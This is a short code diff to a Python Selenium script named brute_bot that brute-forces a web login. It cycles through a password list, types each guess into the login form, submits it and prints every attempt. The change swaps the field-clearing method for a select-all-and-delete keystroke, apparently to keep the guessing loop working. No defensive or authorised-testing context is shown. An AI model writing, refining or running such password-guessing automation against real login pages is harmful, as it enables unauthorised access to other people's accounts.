@@ -66,9 +66,10 @@ class brute_bot(object):
                 for i in self.password:
                     try:
                         password_box = driver.find_element(By.NAME, self.pass_field)
-                        password_box.clear()
+                        # password_box.clear()
                         password_box.send_keys(i)
                         email_box.send_keys(Keys.RETURN)
+                        password_box.send_keys(Keys.CONTROL, "a", Keys.DELETE)
                         time.sleep(int(sys.argv[3]))
                         old = i
                         print(f"Trying - {i}")
